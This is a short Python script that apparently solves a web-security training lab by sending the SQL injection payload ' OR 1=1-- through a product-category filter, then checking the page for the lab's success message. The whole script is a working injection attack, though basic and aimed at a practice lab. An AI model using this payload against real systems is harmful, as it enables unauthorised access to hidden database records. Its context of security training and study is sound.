"""
1. python retrieve-hidden-data.py
2. request the url with our exploit
3. check if solved
    request base_url for the lab
    Check if "Congratulations, you solved the lab!" exists
    sleep 2 seconds
    try again
"""
import sys
import time
import argparse
import logging

import requests

log = logging.getLogger(__name__)
logging.basicConfig(
    stream = sys.stdout,
    level = logging.INFO,
    format = "{asctime} [{threadName}][{levelname}][{name}] {message}",
    style="{",
    datefmt="%H:%M:%S",
)
PAYLOAD = "' OR 1=1-- "
ATTEMPT_LIMIT = 1
DELAY = 2

def parse_args(args:list):
    parser = argparse.ArgumentParser()
    #parser.add_argument(
    #    "-n", "--no-proxy", default=False, action="store_true", help="do not use proxy"
    #)
    parser.add_argument("url", help="url of lab")
    return parser.parse_args()

def normalize_url(url):
    if not url.endswith("/"):
        url = url + '/'
    return url

def is_solved(url:str, num_attempts = 0) -> bool:
    log.info("Checking if solved.")
    resp = requests.get(url)
    if "Congratulations, you solved the lab!" in resp.text:
        log.info("Lab is solved!")
        return True
    if num_attempts < ATTEMPT_LIMIT:
        time.sleep(DELAY)
        num_attempts += 1
        is_solved(url, num_attempts)
    return False

def main(args):
    normalized_url = normalize_url(args.url)
    exploit_url = f"{normalized_url}filter?category=Gifts{PAYLOAD}"
    log.info(f"Getting url: {exploit_url}")
    resp = requests.get(exploit_url)
    if resp.status_code == 200:
        solved = is_solved(normalized_url)
        if solved:
            log.info('Congrats!')
        else:
            log.info('Lab not solved yet')

if __name__ == "__main__":
    args = parse_args(sys.argv)
    main(args)